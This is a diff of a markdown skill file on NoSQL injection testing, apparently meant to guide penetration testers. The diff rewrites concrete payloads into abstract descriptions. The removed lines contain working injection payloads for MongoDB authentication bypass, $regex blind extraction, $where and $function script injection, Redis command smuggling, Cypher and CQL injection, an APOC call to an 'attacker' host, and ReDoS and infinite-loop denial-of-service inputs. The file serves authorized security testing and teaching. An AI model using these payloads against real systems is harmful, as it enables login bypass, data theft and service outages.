@@ -1,264 +1,218 @@
 ---
 name: nosql-injection
 description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, blind extraction, GraphQL variable injection, and Redis/DynamoDB/Elasticsearch/Neo4j-specific attack surfaces
+metadata:
+  version: 1.0.0
 ---
 
 # NoSQL Injection
 
-NoSQL injection exploits the mismatch between how applications pass user input to database queries and how the database engine interprets that input. Unlike SQL injection, NoSQL injection frequently involves operator injection (e.g., MongoDB's `$gt`, `$regex`, `$where`) or structure injection (embedding JSON sub-documents). The attack surface is broad: MongoDB is the dominant target, but Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, and Neo4j each have distinct injection surfaces. GraphQL resolvers passing variables directly into a backing NoSQL filter are a frequent cross-cutting vector.
+NoSQL injection exploits the mismatch between how applications pass user input to a store and how the store interprets it. Unlike SQL injection, it frequently takes the shape of operator embedding (a comparison or pattern operator where a value was expected) or structure injection (a nested document where a scalar was expected). The surface spans store families: document stores with filter operators, key-value stores with command framing, search engines with a query grammar, wide-column stores with a statement grammar, graph stores with a clause grammar, and schema-layer resolvers that pass variables straight into any of them.
 
 ## Attack Surface
 
-**Input shapes that reach query filters**
-- JSON body parameters parsed straight into query objects
-- Form fields with bracket notation (`field[$ne]=`) coerced into operator objects by Express, PHP, and similar middleware
-- URL-encoded JSON in query strings, headers, and cookies
-- GraphQL variables passed directly into resolver-level NoSQL filters
+**Input shapes that reach store queries**
+- Structured body parameters parsed straight into filter objects
+- Form fields with bracket notation, coerced into operator objects by the framework's body parser
+- Encoded structured values in query strings, headers, and cookies
+- Schema-layer variables passed directly into resolver-level filters
 
 **Code patterns that enable injection**
-- Raw filter dicts/objects from user input handed to `find`/`findOne`/`aggregate`
-- String concatenation into Cypher / CQL / Redis commands instead of the driver's parameterized form
-- ODM passthrough: Mongoose `{strict: false}`, Morphia raw `where()`, PyMongo `find()` with unsanitized JSON dicts (legacy `eval()` is fatal)
-- Server-side JavaScript surfaces: `$where`, `$function`, `$accumulator`, CouchDB `_design` views
+- Raw filter objects taken from user input and handed to find or aggregate calls
+- String concatenation into query grammars instead of the driver's parameterized form
+- Object-document mapper passthrough, where schema filtering is disabled or raw query helpers are exposed
+- Server-side script surfaces, where filter or aggregation stages accept executable function bodies
 
-**Stores in scope**
-MongoDB (primary), Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, Neo4j. Couchbase / DocumentDB / HBase / ScyllaDB / Memcached follow the same operator-injection or command-smuggling models - DocumentDB in particular accepts MongoDB payloads unchanged.
+**Store families in scope**
+- Document stores with filter operators and aggregation stages
+- Key-value stores with command framing
+- Search engines with a query grammar and scripted updates
+- Wide-column stores with SQL-shaped statements
+- Graph stores with clause grammars and procedure calls
+- Compatible engines that follow one of the above models
 
 ## Reconnaissance
 
-### Content-Type and Input Shape
+### Input Shape and Encoding
 
-- Identify endpoints accepting `application/json` - these can receive operator objects directly
-- Identify endpoints accepting `application/x-www-form-urlencoded` - bracket notation `username[$ne]=x` maps to `{username: {$ne: 'x'}}` in many frameworks (Express `body-parser`, PHP)
-- Determine whether the backend uses Mongoose, native MongoDB driver, or a REST ODM wrapper
+- Identify endpoints accepting structured bodies, which can receive operator objects directly
+- Identify form-accepting endpoints, where bracket notation maps to an operator object in many frameworks
+- Determine whether the backend uses a mapper layer, the native driver, or a REST wrapper
 
 ### Error Fingerprinting
 
-- Send malformed JSON: `{"username": {"$gt": ""}}`
-- Send bracket notation in form data: `username[$gt]=`
-- Look for MongoDB error messages: `MongoError`, `CastError`, `ValidationError`
-- Stack traces revealing collection names, field names, driver version
+- Send malformed values shaped like operator objects and read the error text
+- Look for driver and cast errors, validation errors, and stack traces naming collections, fields, and versions
 
 ### Operator Probe
 
-Test whether operators pass through to the database:
-```json
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-```
-If authentication succeeds or response differs, operator injection is confirmed.
+- Test whether operators pass through to the store: send a comparison operator where the endpoint expects a literal
+- A login or filter success no literal could produce confirms operator injection
+
+## Detection Channels
+
+- Driver error and validation text naming collections, fields, or cast failures after malformed operator objects.
+- Boolean response, status, or redirect difference between a true predicate and its false pair.
+- Login or filter success from an operator predicate that no literal value could satisfy.
+- Progressive match narrowing across iterated pattern prefixes during character-by-character extraction.
+- An enablement-state answer distinguishing an open script engine gate from a closed one.
+- Sleep-driven latency differential between a truth branch that pauses and one that returns immediately.
+- Stage-error text naming stages, collections, or field paths after malformed stage fragments.
+- Response content from a collection outside the intended scope after a pivot attempt.
+- Latency or volume change from heavy join stages across large unindexed collections.
+- Framing-error text after delimiter probes that names command or argument expectations.
+- A follow-on read showing a smuggled key with attacker-chosen content.
+- Parser error and syntax text after quote and metacharacter probes.
+- Hit-count or content widening between a literal control and a metacharacter attempt.
+- Index and mapping listing content revealing fields and labels for the next fragment.
+- An external-fetch callback where a procedure surface reaches an attacker-observed location.
+
+## Adversarial Capabilities
+
+Store injection testing presupposes a query-reaching input, knowledge of the store family, and a boolean or timing oracle, and it consumes all three.
+- Reach a parameter that flows into a filter, a statement, a command frame, or a pipeline stage.
+- Send structured, form-encoded, and encoded values so the operator passes whichever way the parser accepts.
+- Hold a second principal and a privileged target so a bypass converts into data or action.
+- Read boolean, status, redirect, latency, and volume differences as oracle answers.
+- Fingerprint the store family and its script-engine state before choosing a technique.
+- Trigger callbacks or delays as no-effect oracles before extraction.
+
+## Trust Assumptions
+
+The class rests on one agreement: user input reaches the store as a value, never as query structure.
+The agreement holds every input to a typed scalar before it enters the query, holds the query grammar to the application's own fragments, holds script and procedure surfaces closed to unprivileged callers, and holds each stage or frame to the single operation the application intended.
+Sensitive data and control leak when structure is caller-controlled: an operator changes the predicate, a delimiter splits the frame, a grammar fragment widens the match, or a script body executes.
+Each variant breaks one clause: the value clause, the grammar clause, the script-surface clause, the stage clause, or the frame clause.
 
 ## Key Vulnerabilities
 
-### MongoDB Authentication Bypass
+### Operator Predicate Injection
 
-The classic operator injection against login queries of the form `db.users.findOne({username: input.username, password: input.password})`:
+- The classic bypass: a filter object whose fields carry comparison operators instead of values matches the first document that satisfies them
+- Encodings: structured body objects, form bracket notation, and encoded structured values in other carriers
+- Variations: a literal for one field plus an operator for another, pattern operators matching any value, and set-membership operators listing candidate identities
 
-**JSON body injection:**
-```json
-{"username": {"$ne": null}, "password": {"$ne": null}}
-```
-Matches the first document where both fields are non-null - typically the first user/admin.
+### Blind Extraction Through Pattern Operators
 
-**Form body (bracket notation):**
-```
-username[$ne]=invalid&password[$ne]=invalid
-```
+- When results are not reflected but observable through a boolean, redirect, status, or timing difference, extract field values character by character with pattern operators
+- Binary search over the character space minimizes requests
+- The technique works on any string field, including recovery tokens and API keys
 
-**Variations:**
-```json
-{"username": "admin", "password": {"$gt": ""}}
-{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
-{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
-```
+### Server-Side Script Injection
 
-### Blind Data Extraction via `$regex`
-
-When the query result is not directly reflected but observable (boolean response, redirect, timing), extract field values character by character using `$regex`:
-```json
-{"username": "admin", "password": {"$regex": "^a"}}
-{"username": "admin", "password": {"$regex": "^b"}}
-...
-```
-Binary search the character space to minimize requests. Works on any string field (token, reset code, API key).
-
-### `$where` JavaScript Injection
-
-If `$where` operator is enabled (disabled by default in MongoDB 7.0+; MongoDB 4.4–6.x deprecated it but left `javascriptEnabled` defaulting to `true`), inject arbitrary server-side JavaScript:
-```json
-{"$where": "function(){return this.role == 'admin'}"}                          // direct filter - returns matching documents
-{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}       // timing oracle only - sleep() returns undefined (falsy), so no documents are returned; observe latency
-```
-`sleep()` is available in older MongoDB for blind extraction via response-time differential.
-
-### `$function` and `$accumulator` (MongoDB 4.4+)
-
-Server-side JavaScript in aggregations. `$function` must live inside an expression context - `$expr`, `$project`, `$addFields`, etc. - not as a top-level filter:
-```json
-{"$expr": {"$function": {"body": "function(doc){return doc.role == 'admin'}", "args": ["$$ROOT"], "lang": "js"}}}
-```
-Gated by the same `javascriptEnabled` parameter as `$where`, but reachable through aggregation endpoints - useful when `$where` is filtered at the query layer but aggregation pipelines remain user-influenceable.
+- Filter and aggregation surfaces accepting executable function bodies run attacker script in the store process
+- Timing oracles via sleep, and truth branches that return documents, are the two observable shapes
+- The same engine gate governs filter-level and aggregation-level script; aggregation paths are often the reachable one when the filter surface is filtered
 
 ### Aggregation Pipeline Injection
 
-`$match`, `$lookup`, and `$project` stages accept the same operator payloads as `find()`. User-controlled `$lookup.from` is the highest-impact variant - it can pivot the query to a different collection (e.g., from `orders` into `users`) and exfiltrate cross-tenant data.
+- Match, lookup, and projection stages accept the same operator payloads as plain finds
+- A caller-controlled lookup target is the highest-impact shape: it pivots the query to a different collection and returns cross-scope data
+- Stage targeting differs from row filtering, so a filtered find surface does not imply a filtered pipeline surface
 
-### Redis Command Injection
+### Key-Value Command Smuggling
 
-When Redis commands are constructed by string concatenation:
-```python
-redis.execute_command(f"SET {user_key} {value}")
-```
-Inject newline characters (`\r\n`) to inject additional Redis commands (RESP protocol injection):
-```
-key\r\nSET backdoor attacker_controlled\r\nSET dummy
-```
+- Where commands are built by string concatenation, injected delimiters split one command into several
+- The follow-on read shows whether the extra command took effect
+- Framing-error text reveals the command and argument expectations
 
-### Elasticsearch Query String Injection
+### Query-Language Injection
 
-`query_string` and `simple_query_string` accept Lucene syntax. User input flowing directly:
-```
-q=normal+search            →   normal results
-q=*                        →   all documents
-q=role:admin               →   filter by field
-q=_exists_:password_hash   →   existence probe
-```
+- Search and graph query grammars accept metacharacters that widen a match, list fields, or chain clauses
+- Wildcards and existence probes enumerate documents without a filter
+- Procedure calls in graph surfaces fetch external resources or run dynamic queries when enabled
 
-For Painless script injection via `_update`:
-```json
-{"script": {"source": "ctx._source.role = params.r", "params": {"r": "admin"}}}
-```
-If the `source` field is user-controlled, inject arbitrary Painless.
+### Statement Grammar Injection
 
-### DynamoDB FilterExpression Injection
+- SQL-shaped wide-column stores follow the classic pattern where input is concatenated instead of bound: clause injection, always-true predicates, and chained clauses
+- No sleep or out-of-band primitive is available on these surfaces, so detection is boolean or error-based
 
-PartiQL injection allows expansion of intended queries:
-```sql
--- Intended:
-SELECT * FROM Users WHERE username = 'input'
+### Schema-Layer Variable Injection
 
--- Injected:
-SELECT * FROM Users WHERE username = 'x' OR '1'='1
-```
+- Resolvers passing variables straight into a store filter turn any input type that accepts arbitrary objects into an operator candidate
+- Introspection enumerates which input types accept objects rather than scalars
+- Combine with aliasing and batching to compare verdicts inside one request
 
-### Cassandra CQL Injection
+### Exhaustion Surfaces
 
-CQL is SQL-shaped, so injection follows the SQL pattern when input is concatenated instead of bound via `session.prepare()`:
+- Catastrophic backtracking through nested pattern operators against long values
+- Very large membership arrays forcing linear scans on unindexed fields
+- Unbounded script loops where the engine accepts them without query timeouts
+- Chained heavy join stages across large unindexed collections
 
-```
-username: ' OR '1'='1' ALLOW FILTERING --
-username: 'x' OR token(username) > token('a') ALLOW FILTERING --
-```
+## Advanced Techniques
 
-No `SLEEP` or OOB primitive natively - detection is boolean/error-based only.
+### Engine State Fingerprinting
 
-### CouchDB Mango and View Injection
+- Establish the script-engine gate and the server version before investing in script payloads; both decide feasibility
+- Error text and status endpoints answer the gate question in one request
 
-Mango selectors on `_find` accept operator payloads in the same shape as MongoDB:
-```json
-POST /db/_find  { "selector": {"username": "admin", "password": {"$gt": ""}} }
-POST /db/_find  { "selector": {"role": {"$regex": "^admin"}} }
-```
+### Blind Integration
 
-`_design` document injection - if user input flows into a design doc's `views.<name>.map`, the JavaScript runs server-side in the Couch sandbox on every view query:
-```json
-{"views": {"x": {"map": "function(doc){ emit(doc._id, doc) }"}}}
-```
+- Combine the boolean oracle with timing to cross-check predicate truth where responses are partly masked
+- Treat extraction as one letter per request across the partial space, halving with binary search
 
-Also probe `_all_docs?include_docs=true` for unscoped enumeration and check for admin-party misconfigurations (`_users/_all_docs` reachable without auth) before payload work.
+### Escalation After Bypass
 
-### Neo4j Cypher Injection
-
-When user input is concatenated into Cypher rather than passed as a parameter (`$param`):
-```python
-# Vulnerable
-session.run(f"MATCH (u:User {{name: '{name}'}}) RETURN u")
-
-# Injected: name = x'}) RETURN u UNION MATCH (u:User) RETURN u //
-```
-
-**APOC abuse** (when `apoc.*` procedures are enabled via `dbms.security.procedures.unrestricted`):
-- `CALL apoc.load.json('http://attacker/x')` - SSRF and external data fetch
-- `CALL apoc.cypher.run("...", {})` - dynamic query execution from a string
-- `CALL dbms.security.listUsers()` - user enumeration on misconfigured Community Edition
-
-### GraphQL Variable Injection
-
-Resolvers passing variables straight into a backing NoSQL filter are a common chained vector:
-```graphql
-query Login($input: UserFilter!) {
-  user(filter: $input) { id role }
-}
-```
-With `$input` reaching `db.users.findOne(input)`, send:
-```json
-{"input": {"username": "admin", "password": {"$ne": ""}}}
-```
-Use introspection (`__schema`, `__type`) to enumerate which input types accept arbitrary objects - those are the operator-injection candidates.
-
-### Server-Side JavaScript Detection and DoS
-
-Fingerprint SSJS state before investing in `$where` / `$function` payloads:
-```javascript
-db.adminCommand({getParameter: 1, javascriptEnabled: 1})
-```
-
-DoS surface (use only with explicit authorization scope):
-- **ReDoS**: `{"field": {"$regex": "^(a+)+$"}}` against long values triggers catastrophic backtracking
-- **Large `$in` arrays**: thousands of values force linear scans on unindexed fields
-- **Infinite `$where` loops**: `{"$where": "while(true){}"}` if SSJS is enabled without query timeouts
-- **Heavy aggregations**: chained `$lookup` across large unindexed collections
+- Convert an authentication bypass into durable access with a second request to a privileged surface
+- Prefer the narrowest read that proves the scope break
 
 ## Bypass Techniques
 
 **Type Coercion**
-- Send operators as arrays: `{"$gt": [""]}` - some drivers coerce arrays
-- Mix string and object types in the same request to trigger parser branches
+- Send operators as arrays, where some drivers coerce them; mix string and object types in one request to trigger parser branches
 
 **Encoding**
-- URL-encode brackets: `username%5B%24ne%5D=x` → `username[$ne]=x`
-- Double-encode for WAFs sitting in front of JSON-parsing backends
+- Encode brackets and operator markers; double-encode where a filter sits in front of a structured-body backend
 
 **Operator Alternatives**
-- `$nin` (not in), `$exists: false`, `$type` - alternative operators that reach the same result when `$ne` is filtered
-- `$not` wrapping another operator: `{"field": {"$not": {"$eq": "value"}}}`
-- `$expr` with `$ne` for complex comparisons: `{"$expr": {"$ne": ["$password", "wrong"]}}`
+- Substitute operators that reach the same result when the obvious one is filtered, and wrap one operator inside another
+- Expression contexts carry comparisons the top-level filter rejects
 
 **Structure Manipulation**
-- Dotted-key vs nested object: `{"a.b": "c"}` vs `{"a": {"b": "c"}}` - sanitizers often strip one form but pass the other
-- Array vs object operator wrapping: some parsers treat `["$or", ...]` as operator arrays
-- Prototype pollution: `__proto__` and `constructor.prototype` keys in JSON bodies polluting Object prototypes consumed downstream by query builders
-- `$regex` case-insensitive flag (`"$options": "i"`) widens matches that case-sensitive filters miss
+- Dotted keys versus nested objects, where sanitizers strip one form and pass the other
+- Array versus object operator wrapping, where parsers disagree on which is the operator
+- Prototype keys in structured bodies that pollute shared objects consumed by the query builder
+- Case-insensitive pattern flags that widen matches case-sensitive filters miss
 
 ## Testing Methodology
 
-1. **Identify query-receiving endpoints** - login, search, filter, lookup
-2. **Determine input format** - JSON body vs form fields vs URL params
-3. **Send error-probing payloads** - malformed operator objects; watch for MongoDB/driver errors
-4. **Attempt operator injection** - `$ne`, `$gt`, `$regex` against login endpoint
-5. **Confirm boolean oracle** - response, status, redirect differs between true/false predicates
-6. **Extract data blindly** - character-by-character `$regex` on sensitive fields (token, reset code)
-7. **Test `$where`** - if older MongoDB version detected, attempt JavaScript sleep-based timing
-8. **Probe aggregation endpoints** - inject operators into `filter`/`match`/`sort` fields
-9. **Test non-MongoDB stores** - Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL, CouchDB Mango selectors, Neo4j Cypher concatenation, Cassandra CQL
-10. **Test GraphQL resolvers** - submit operator objects via variables on any input type that reaches a NoSQL filter; use `__schema` introspection to enumerate candidates
+1. **Identify query-receiving endpoints** - Login, search, filter, lookup
+2. **Determine the input format** - Structured body, form fields, query parameters
+3. **Send error-probing values** - Malformed operator objects; watch for driver errors
+4. **Attempt operator injection** - Comparison, pattern, and set-membership operators against the login surface
+5. **Confirm the boolean oracle** - Response, status, or redirect differs between true and false predicates
+6. **Extract blindly** - Character-by-character pattern operators on the sensitive fields
+7. **Test script surfaces** - Where the engine gate is open, attempt a timing script body
+8. **Probe aggregation surfaces** - Inject operators into the filter, match, and sort fields
+9. **Probe the other store families** - Command framing, query grammar, statement grammar, graph clauses
+10. **Test schema-layer resolvers** - Submit operator objects through variables on any input type reaching a store filter
+
+## Variants
+
+- nosql-operator-injection - Embed query operators in filter input to bypass checks and extract fields, using boolean differentials as the oracle.
+- nosql-server-side-script-injection - Place executable function bodies in filter and aggregation expressions, using sleep-driven timing for blind predicates.
+- nosql-aggregation-pipeline-injection - Steer aggregation stages and collection pivots with crafted input where filters, matches, and sorts feed pipeline construction.
+- nosql-query-language-injection - Break escaping in graph, search, and statement grammars where input concatenates into clauses.
+- nosql-command-protocol-smuggling - Split one key-value request into extra commands where key or value text concatenates into command construction.
 
 ## False Positives
 
-- Framework-level query builder that casts input to string before constructing the query (Mongoose `strict` mode on)
-- Input sanitization stripping operator keys before they reach the driver
-- Endpoints that accept JSON but cast the `password` field to string - operator object becomes `[object Object]`
-- Response differences caused by validation errors, not actual operator execution
+- A query builder that casts input to a string before constructing the query
+- Sanitization that strips operator keys before they reach the driver
+- Endpoints that accept structured bodies but cast the sensitive field to a string, turning an operator object into a literal rendering
+- Response differences caused by validation errors rather than operator execution
 
 ## Pro Tips
 
-1. Always try both JSON body (`{"field": {"$ne": null}}`) and bracket-notation form (`field[$ne]=`) - different middleware handles them differently
-2. Target reset token and API key fields with `$regex` extraction, not just passwords
-3. Check MongoDB version via error messages or `/admin/serverStatus`; `$where` is active by default on pre-7.0 instances - that includes 4.4–6.x targets where `javascriptEnabled` was deprecated but not yet disabled, making them still exploitable unless explicitly hardened
-4. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
-5. Combine authentication bypass with a second request to `/admin` or `/api/users` to escalate impact
-6. Automate `$regex` extraction with binary search: 7 requests per character vs 94 with linear search
-7. GraphQL resolvers are an underexplored entry point - try operator objects in any input type that reaches a NoSQL filter, and use introspection to find candidate fields
+1. Try both the structured body and the bracket-notation form; different middleware handles them differently
+2. Target recovery-token and key fields with pattern extraction, not only passwords
+3. Fingerprint the engine gate and version early; it decides whether script surfaces are worth probing
+4. For search engines, try listing and mapping surfaces before scripted updates
+5. Combine a bypass with a second request to a privileged surface to escalate impact
+6. Automate pattern extraction with binary search: a handful of requests per character
+7. Schema-layer resolvers are an underexplored entry point; try operator objects in any input type that reaches a store filter
 
 ## Summary
 
-NoSQL injection exploits the same root cause as SQL injection - user input controlling query structure - but through operator embedding rather than syntax breaking. MongoDB is the primary target; enforce schema validation, use parameterized equivalents (strict mode, typed schemas), and never pass raw user input as a query object.
+NoSQL injection has the same root cause as SQL injection - user input controlling query structure - reached through operator embedding rather than syntax breaking. Enforce typed schema validation, bind values through the driver's parameterized form, keep script surfaces closed, and never pass raw user input as a query object.
